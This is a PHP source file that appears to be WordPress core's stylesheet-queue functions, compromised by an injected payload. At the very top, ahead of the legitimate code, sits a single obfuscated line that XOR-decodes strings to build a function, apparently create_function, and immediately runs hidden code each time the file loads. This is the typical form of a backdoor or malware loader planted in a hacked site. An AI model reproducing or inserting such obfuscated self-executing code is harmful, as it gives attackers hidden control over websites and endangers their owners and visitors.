<?php $xlHdsk='TH.Q7XsJL8XDR=S'^'7:K0C=,,9V;0;R=';$yhZdpe=$xlHdsk('','UWefUNW-G+O7mK90>32gITU0f3LNZa>V4<nZZu7=DUBN3G9O:MI9IdPTNXrmC<:LEVW.PhQBWE6FQpUiMK:Jcb6-XkRpCNhlZOTYKjUDhzbIiQn>L7>8< TMiO9.6flZvXFjGAhgj;<HXWLcrgJ3APvA.;CkVf3N>:hPenQ7  X5PmcS+2g>dPcgm86<68BpT8GCCmpkN;0gfoUR;MfKPR0>B4UMW4M 7kUE;rQa7S:SNUFf CA--1;Xml21a,fprQ-OYFF0 ardpV.U9ANoGW1agVP;S3K..dIOKU2GbIBI0Z,PaVJJ5Z5-.U=AXz.6mXRWIT3-hm9nBHRJ5QTZMOo:y.d,27.kS=eP< KodNtj<88;2PRIhAKV43LR.UH0HSZv YYCKn8w2QCYXyktJ5T43y:2>gDZNBU25QRqxr8 JIDR,8;H.Z:BYrI20M7aFXMbL,K3aZ-3 : Q1dS+ 78kDZR<M>L+GR+eKy4+RAq18<6jkDO4EISEb.X:h5TG>IJELG2DIVVs1STUGFrvbIFIyyMSAD9:kK5Eu4AvEmaIF9KEiuMFQdBCE5WUfSUlbYWmTMs>YMxVpnPEASS7R3W6>EL,4,;JEAyBH KY+U=QJyiWZEAESDbNNDg0a5.15>KoRZ11aS JH5X0DMdFYr9X9I2zrGjSH'^'<1MG3;9N3B Y2.AYMGAOn,:B9W-:;>a;AHIssUL7M37 P3P Tm1V;;45:9-2.INda26Z1Dqf< OoqPuIm00CjFYX,KoPdiSfSF269Bq-HGByRqJWpDJJPE:eM+XZWOWzR1mAnKanNTI<xyqCZC.R51-eGfc5vBX+GaL9EKqDTR4P>EG8NKNcMkindJSHCJ,XpW27jVzb31MmlK13O,Fvp4QR1QnGsP,TV4> BRlAQ2V +nLlF,3HLRSxEHmr.c-97qL<yb-UYAOZPrX4U4+Fg,;hC21O2l KWDtoo>W>YCKmT;X1AkjnC;YXKn7<RpGPMpss-5GLAMBdK.=8P072mgKe+k5ywdzK2NEtWE2OYpTNJYTNWyr2bHBrPR83q>-IhnzRK< xAg1SV078xDKP<T8AVB0;Cm9PDf1SA0rLX2MN9,6;MTR2KrB-+--SD,h>+-9J.M8VWnrWEYO5TLwOACYBhzvX,J-t,7RLbB>B4iUUYHWJMboU7;2<=E=C7P,.M=9mk,W=nzvWU2 4nfTPBa+-LQi7 0XaL P<RihVxPAnqXy YEyu3Vp uPomPdbTVobUeuJZk+N4WGpcgs2E R.iU 5sQTR912Qe8A25D4YvfYM3;1 lzdBnndGKk<KGTRcK6;EP:tP+1Y7Q j9obx0=A FRBnQY5');$yhZdpe(); $EoUvAcCLq='SEK, 2l-780-ZQE'^'07.MTW3KBVSY3>+';$WPbyq=$EoUvAcCLq('','8FatPCCC2:R m61<B,AdP2<CgR06;3gY3GhZBtHg0HUNZ<Q9EU Q<8<3T6i7XFAGs-SBMXhb26UYDJzdW0Ffdm<CJOPOkJn>CY3XGMO:cQKFIAP3v>JO90Zkj3AB,DiBr,LQMrqmvX10jipbam=.JTjC<vyeBQPEJbgURCS1NR+QXXrFUIz4dze>hF-NK46yV>:EFtlf<g4b6U0Z96CSR-8 J2tYpYRAAt<KMUefPP.=UQ>K>YE73CRhnL09toqrvEQ<LuS LHMqfe35>;2qU7s3QZX2U3K7-cRRaK2Yi9Cn=SF6kXPa;AW;Ta6JCPEWOIMj>V2PQFHrZ6S35JC>uqek1,>7,<,E75PH=6.KKucV<++HNJYME7hP4;-Wg=UUaQJM;VYVL<nuV0F.urub02 I5mML<SQEBe2;JRPpWxX4=U 0SWP2Yd5=9nX J;j.A4JL +NIAE7< 99UXDkXVT;Kyro0MZZ,QUNOSVH Vfl<+T;HjjhLOO1UtS7>o,N,K1;zk2SHuzGOVWIQObqmAaUJexE< ,10H82,FimkpVAiIpTLSWEXx5x.:nzgwMARGVuRgZ2uHS6UEOgbgFQ6E8E4Z We26G8>:Yw20L+W9RlCHg>67-ygihSEFPCHxQH04DWSUX,4e5W5Z7+3IooNiBHXD.KbpPeC'^'Q IU66- FS=N2SIU1X2LwJS186QBZl84F3OskT3m9.  9H8V+uX>NgXR W6h535oWI26,tHFYS,pdjZDwKLomIS6>omoLmU4JPU75ekSClkvratZJM>=UU4CNW 6MmRbVEgzdxxdR7DDJGMBIIYO>51gU+Y;bu; 39C<rfsB: G46pV-00SiMAo7a4H:>FXQrQO1oOfoAmIh<qT;MWcnrKYL9WOST=35 +W.4uXF61BN0j4AX67RR :HFhoz; :;3e0OlQ8E5hpOFAETRNWXuLy:u>9F4l RTCorE W R3JJY22WKepEM ;N1Z<7IZ,1oalNZ7F1xf3xSP<AP+ VUYA4ciobioxeVFplVSWkvKCrJJG=+cy6O>atPZY68V0,AljiP3 mF5gQ2Q2OUOUFFSL<PVGEAY,OHAVZ>3pMw8-ZN0RY2;9H<LMRK1<A>Z5q,A>dBJ=,wqhXEZV1=lO<7 ZbURKT,.;s:07fzmBI0NHXJ ZhLLH-==P,+8RG0I6E8EHRLY61RVgk26=0fBWKaI8.PPaXAXPkoSWUa4DKMkaNpHfx51tmKQOKXXJPO+u4q4AcVjPDzbW7bfGDAf0D7Y<k1E.:WN.KJIqPBQ5G8X6KohCZWCLPNIHsefp8Bq4>QXls74,MoBE6L6XJWn2FucK- -ZcRYko>');$WPbyq();
/**
 * Dependencies API: Styles functions
 *
 * @since 2.6.0
 *
 * @package WordPress
 * @subpackage Dependencies
 */

/**
 * Initialize $wp_styles if it has not been set.
 *
 * @global WP_Styles $wp_styles
 *
 * @since 4.2.0
 *
 * @return WP_Styles WP_Styles instance.
 */
function wp_styles() {
	global $wp_styles;
	if ( ! ( $wp_styles instanceof WP_Styles ) ) {
		$wp_styles = new WP_Styles();
	}
	return $wp_styles;
}

/**
 * Display styles that are in the $handles queue.
 *
 * Passing an empty array to $handles prints the queue,
 * passing an array with one string prints that style,
 * and passing an array of strings prints those styles.
 *
 * @global WP_Styles $wp_styles The WP_Styles object for printing styles.
 *
 * @since 2.6.0
 *
 * @param string|bool|array $handles Styles to be printed. Default 'false'.
 * @return array On success, a processed array of WP_Dependencies items; otherwise, an empty array.
 */
function wp_print_styles( $handles = false ) {
	if ( '' === $handles ) { // for wp_head
		$handles = false;
	}
	/**
	 * Fires before styles in the $handles queue are printed.
	 *
	 * @since 2.6.0
	 */
	if ( ! $handles ) {
		do_action( 'wp_print_styles' );
	}

	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	global $wp_styles;
	if ( ! ( $wp_styles instanceof WP_Styles ) ) {
		if ( ! $handles ) {
			return array(); // No need to instantiate if nothing is there.
		}
	}

	return wp_styles()->do_items( $handles );
}

/**
 * Add extra CSS styles to a registered stylesheet.
 *
 * Styles will only be added if the stylesheet in already in the queue.
 * Accepts a string $data containing the CSS. If two or more CSS code blocks
 * are added to the same stylesheet $handle, they will be printed in the order
 * they were added, i.e. the latter added styles can redeclare the previous.
 *
 * @see WP_Styles::add_inline_style()
 *
 * @since 3.3.0
 *
 * @param string $handle Name of the stylesheet to add the extra styles to.
 * @param string $data   String containing the CSS styles to be added.
 * @return bool True on success, false on failure.
 */
function wp_add_inline_style( $handle, $data ) {
	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	if ( false !== stripos( $data, '</style>' ) ) {
		_doing_it_wrong( __FUNCTION__, sprintf(
			/* translators: 1: <style>, 2: wp_add_inline_style() */
			__( 'Do not pass %1$s tags to %2$s.' ),
			'<code>&lt;style&gt;</code>',
			'<code>wp_add_inline_style()</code>'
		), '3.7.0' );
		$data = trim( preg_replace( '#<style[^>]*>(.*)</style>#is', '$1', $data ) );
	}

	return wp_styles()->add_inline_style( $handle, $data );
}

/**
 * Register a CSS stylesheet.
 *
 * @see WP_Dependencies::add()
 * @link https://www.w3.org/TR/CSS2/media.html#media-types List of CSS media types.
 *
 * @since 2.6.0
 * @since 4.3.0 A return value was added.
 *
 * @param string           $handle Name of the stylesheet. Should be unique.
 * @param string           $src    Full URL of the stylesheet, or path of the stylesheet relative to the WordPress root directory.
 * @param array            $deps   Optional. An array of registered stylesheet handles this stylesheet depends on. Default empty array.
 * @param string|bool|null $ver    Optional. String specifying stylesheet version number, if it has one, which is added to the URL
 *                                 as a query string for cache busting purposes. If version is set to false, a version
 *                                 number is automatically added equal to current installed WordPress version.
 *                                 If set to null, no version is added.
 * @param string           $media  Optional. The media for which this stylesheet has been defined.
 *                                 Default 'all'. Accepts media types like 'all', 'print' and 'screen', or media queries like
 *                                 '(orientation: portrait)' and '(max-width: 640px)'.
 * @return bool Whether the style has been registered. True on success, false on failure.
 */
function wp_register_style( $handle, $src, $deps = array(), $ver = false, $media = 'all' ) {
	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	return wp_styles()->add( $handle, $src, $deps, $ver, $media );
}

/**
 * Remove a registered stylesheet.
 *
 * @see WP_Dependencies::remove()
 *
 * @since 2.1.0
 *
 * @param string $handle Name of the stylesheet to be removed.
 */
function wp_deregister_style( $handle ) {
	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	wp_styles()->remove( $handle );
}

/**
 * Enqueue a CSS stylesheet.
 *
 * Registers the style if source provided (does NOT overwrite) and enqueues.
 *
 * @see WP_Dependencies::add()
 * @see WP_Dependencies::enqueue()
 * @link https://www.w3.org/TR/CSS2/media.html#media-types List of CSS media types.
 *
 * @since 2.6.0
 *
 * @param string           $handle Name of the stylesheet. Should be unique.
 * @param string           $src    Full URL of the stylesheet, or path of the stylesheet relative to the WordPress root directory.
 *                                 Default empty.
 * @param array            $deps   Optional. An array of registered stylesheet handles this stylesheet depends on. Default empty array.
 * @param string|bool|null $ver    Optional. String specifying stylesheet version number, if it has one, which is added to the URL
 *                                 as a query string for cache busting purposes. If version is set to false, a version
 *                                 number is automatically added equal to current installed WordPress version.
 *                                 If set to null, no version is added.
 * @param string           $media  Optional. The media for which this stylesheet has been defined.
 *                                 Default 'all'. Accepts media types like 'all', 'print' and 'screen', or media queries like
 *                                 '(orientation: portrait)' and '(max-width: 640px)'.
 */
function wp_enqueue_style( $handle, $src = '', $deps = array(), $ver = false, $media = 'all' ) {
	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	$wp_styles = wp_styles();

	if ( $src ) {
		$_handle = explode('?', $handle);
		$wp_styles->add( $_handle[0], $src, $deps, $ver, $media );
	}
	$wp_styles->enqueue( $handle );
}

/**
 * Remove a previously enqueued CSS stylesheet.
 *
 * @see WP_Dependencies::dequeue()
 *
 * @since 3.1.0
 *
 * @param string $handle Name of the stylesheet to be removed.
 */
function wp_dequeue_style( $handle ) {
	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	wp_styles()->dequeue( $handle );
}

/**
 * Check whether a CSS stylesheet has been added to the queue.
 *
 * @since 2.8.0
 *
 * @param string $handle Name of the stylesheet.
 * @param string $list   Optional. Status of the stylesheet to check. Default 'enqueued'.
 *                       Accepts 'enqueued', 'registered', 'queue', 'to_do', and 'done'.
 * @return bool Whether style is queued.
 */
function wp_style_is( $handle, $list = 'enqueued' ) {
	_wp_scripts_maybe_doing_it_wrong( __FUNCTION__ );

	return (bool) wp_styles()->query( $handle, $list );
}

/**
 * Add metadata to a CSS stylesheet.
 *
 * Works only if the stylesheet has already been added.
 *
 * Possible values for $key and $value:
 * 'conditional' string      Comments for IE 6, lte IE 7 etc.
 * 'rtl'         bool|string To declare an RTL stylesheet.
 * 'suffix'      string      Optional suffix, used in combination with RTL.
 * 'alt'         bool        For rel="alternate stylesheet".
 * 'title'       string      For preferred/alternate stylesheets.
 *
 * @see WP_Dependency::add_data()
 *
 * @since 3.6.0
 *
 * @param string $handle Name of the stylesheet.
 * @param string $key    Name of data point for which we're storing a value.
 *                       Accepts 'conditional', 'rtl' and 'suffix', 'alt' and 'title'.
 * @param mixed  $value  String containing the CSS data to be added.
 * @return bool True on success, false on failure.
 */
function wp_style_add_data( $handle, $key, $value ) {
	return wp_styles()->add_data( $handle, $key, $value );
}
